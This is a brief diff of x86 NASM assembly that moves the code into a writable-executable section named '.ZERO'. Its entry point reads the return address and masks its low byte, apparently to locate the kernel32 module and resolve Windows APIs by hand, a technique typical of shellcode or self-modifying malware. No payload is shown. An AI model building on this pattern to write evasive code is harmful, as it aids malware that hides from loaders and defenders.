@@ -1,4 +1,4 @@
-SECTION .data		; data section
+SECTION .data
 
 s_zero_zone dd 'Zero_Zone', 0
 s_shell32 dd 'Shell32.dll', 0
@@ -18,10 +18,10 @@ get_proc_addr: dd 0
 kernel_module: dd 0 
 std_handle: dd 0
 
-
-SECTION .text		; code section	
-	global main ;make main: label be the global entry point
+SECTION .ZERO EXEC WRITE ALIGN=16
+	global main
 	main:
+	
 	mov eax, [esp]
 	xor al, al
 	
